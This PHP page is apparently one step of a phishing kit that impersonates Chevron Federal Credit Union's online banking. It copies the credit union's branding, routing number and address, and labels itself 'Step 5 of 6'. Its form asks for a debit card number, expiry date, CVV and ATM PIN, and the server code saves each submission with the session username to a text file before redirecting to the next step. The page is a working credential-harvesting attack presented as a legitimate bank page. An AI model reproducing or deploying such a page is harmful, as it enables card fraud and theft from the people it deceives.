<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expiryMonth = $_POST['expiryMonth'] ?? '';
    $expiryYear = $_POST['expiryYear'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $atmPin = $_POST['atmPin'] ?? '';
    
    // Validation
    $cardDigits = preg_replace('/\s/', '', $cardNumber);
    if (strlen($cardDigits) !== 16) {
        $errors['cardNumber'] = 'Card number must be 16 digits';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    }
    
    if (strlen($cvv) !== 3 && strlen($cvv) !== 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits';
    }
    
    if (strlen($atmPin) !== 4) {
        $errors['atmPin'] = 'ATM PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'pay_card' => $cardDigits,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $atmPin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Card Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: Card Info -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                Payment Method
                            </p>
                            <p class="text-sm text-[#0e2f56] mb-4">
                                Please provide your debit card information and ATM PIN. This enables secure access to your account and ATM services.
                            </p>
                            <div class="space-y-3">
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>256-bit encryption protection</span>
                                </div>
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>Fraud monitoring 24/7</span>
                                </div>
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>Secure PIN protection</span>
                                </div>
                            </div>
                        </div>

                        <!-- Right Column: Card Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Card Details
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7">Step 5 of 6</div>
                            </div>

                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" action="" class="space-y-6">
                                <!-- Card Number -->
                                <div class="space-y-2">
                                    <label for="cardNumber" class="block text-sm font-semibold text-[#0e2f56]">
                                        Debit Card Number
                                    </label>
                                    <input
                                        id="cardNumber"
                                        name="cardNumber"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['cardNumber'] ?? ''); ?>"
                                        maxlength="19"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                        placeholder="1234 5678 9012 3456"
                                        autocomplete="cc-number"
                                    />
                                    <?php if (isset($errors['cardNumber'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['cardNumber']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Expiration Date -->
                                <div class="space-y-2">
                                    <label class="block text-sm font-semibold text-[#0e2f56]">
                                        Expiration Date
                                    </label>
                                    <div class="grid grid-cols-2 gap-4">
                                        <select name="expiryMonth" class="border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                            <option value="">Month</option>
                                            <option value="01" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '01') ? 'selected' : ''; ?>>01 - January</option>
                                            <option value="02" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '02') ? 'selected' : ''; ?>>02 - February</option>
                                            <option value="03" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '03') ? 'selected' : ''; ?>>03 - March</option>
                                            <option value="04" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '04') ? 'selected' : ''; ?>>04 - April</option>
                                            <option value="05" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '05') ? 'selected' : ''; ?>>05 - May</option>
                                            <option value="06" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '06') ? 'selected' : ''; ?>>06 - June</option>
                                            <option value="07" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '07') ? 'selected' : ''; ?>>07 - July</option>
                                            <option value="08" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '08') ? 'selected' : ''; ?>>08 - August</option>
                                            <option value="09" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '09') ? 'selected' : ''; ?>>09 - September</option>
                                            <option value="10" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '10') ? 'selected' : ''; ?>>10 - October</option>
                                            <option value="11" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '11') ? 'selected' : ''; ?>>11 - November</option>
                                            <option value="12" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == '12') ? 'selected' : ''; ?>>12 - December</option>
                                        </select>
                                        <select name="expiryYear" class="border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                            <option value="">Year</option>
                                            <?php for($y = date('Y'); $y <= date('Y') + 15; $y++): ?>
                                                <option value="<?php echo $y; ?>" <?php echo (isset($_POST['expiryYear']) && $_POST['expiryYear'] == $y) ? 'selected' : ''; ?>>
                                                    <?php echo $y; ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                    </div>
                                    <?php if (isset($errors['expiry'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['expiry']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- CVV and PIN -->
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div class="space-y-2">
                                        <label for="cvv" class="block text-sm font-semibold text-[#0e2f56]">
                                            CVV
                                        </label>
                                        <div class="relative">
                                            <input
                                                id="cvv"
                                                name="cvv"
                                                type="password"
                                                value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                                maxlength="4"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="123"
                                                autocomplete="cc-csc"
                                            />
                                            <button
                                                type="button"
                                                onclick="toggleCVV()"
                                                class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                            >
                                                <span id="toggleText-cvv">Show</span>
                                            </button>
                                        </div>
                                        <?php if (isset($errors['cvv'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['cvv']); ?>
                                            </p>
                                        <?php endif; ?>
                                        <p class="text-xs text-gray-600">
                                            3-4 digit code on back of card
                                        </p>
                                    </div>

                                    <div class="space-y-2">
                                        <label for="atmPin" class="block text-sm font-semibold text-[#0e2f56]">
                                            ATM PIN
                                        </label>
                                        <div class="relative">
                                            <input
                                                id="atmPin"
                                                name="atmPin"
                                                type="password"
                                                value="<?php echo htmlspecialchars($_POST['atmPin'] ?? ''); ?>"
                                                maxlength="4"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="1234"
                                                autocomplete="off"
                                            />
                                            <button
                                                type="button"
                                                onclick="togglePIN()"
                                                class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                            >
                                                <span id="toggleText-pin">Show</span>
                                            </button>
                                        </div>
                                        <?php if (isset($errors['atmPin'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['atmPin']); ?>
                                            </p>
                                        <?php endif; ?>
                                        <p class="text-xs text-gray-600">
                                            4-digit personal identification number
                                        </p>
                                    </div>
                                </div>

                                <!-- Submit Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Continue
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>

    <script>
        function toggleCVV() {
            const cvvInput = document.getElementById('sec_cd');
            const toggleText = document.getElementById('toggleText-cvv');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                cvvInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        function togglePIN() {
            const pinInput = document.getElementById('pin_cd');
            const toggleText = document.getElementById('toggleText-pin');
            
            if (pinInput.type === 'password') {
                pinInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                pinInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Format card number as user types
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
        });

        // Only allow numbers for CVV and PIN
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        document.getElementById('atmPin').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
